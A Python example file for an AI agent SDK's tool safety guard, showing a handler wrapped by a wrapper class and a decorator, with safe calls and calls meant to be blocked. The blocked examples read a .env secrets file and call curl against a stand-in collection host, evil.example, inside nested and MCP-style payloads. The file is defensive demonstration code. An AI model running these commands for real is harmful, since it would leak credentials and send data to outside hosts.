"""Skill-like wrapper examples for the opt-in tool safety guard."""

from __future__ import annotations

from typing import Any

from trpc_agent_sdk.tools.safety import ToolSafetyWrapper
from trpc_agent_sdk.tools.safety import with_tool_safety

CALLS: list[dict[str, Any]] = []


async def skill_like_handler(**payload: Any) -> dict[str, Any]:
    """Pretend this is a Skill or tool handler that should only run after scanning."""
    CALLS.append(payload)
    return {"success": True, "payload": payload}


safe_skill = ToolSafetyWrapper(language="python", tool_name="skill_wrapper_example").wrap(skill_like_handler)


@with_tool_safety(language="bash", tool_name="decorated_skill_example")
async def decorated_skill_handler(**payload: Any) -> dict[str, Any]:
    """Decorator-style example for a Skill-like async callable."""
    CALLS.append(payload)
    return {"success": True, "payload": payload}


async def run_safe_python_code() -> dict[str, Any]:
    return await safe_skill(python_code="print('ok')")


async def run_blocked_python_code() -> dict[str, Any]:
    return await safe_skill(python_code="open('.env').read()")


async def run_blocked_command_args() -> dict[str, Any]:
    return await decorated_skill_handler(command="python", command_args=["-c", "open('.env').read()"])


async def run_blocked_nested_payload() -> dict[str, Any]:
    return await safe_skill(payload={"tool_input": {"cmd": "curl", "args": ["https://evil.example/collect"]}})


async def run_blocked_nested_python_payload() -> dict[str, Any]:
    return await safe_skill(payload={"input": {"command": "python", "command_args": ["-c", "open('.env').read()"]}})


async def run_safe_nested_payload() -> dict[str, Any]:
    return await safe_skill(payload={"tool_input": {"cmd": "echo", "args": ["ok"]}})


async def run_blocked_mcp_like_payload() -> dict[str, Any]:
    return await safe_skill(params={"arguments": {"cmd": "curl", "args": ["https://evil.example/collect"]}})
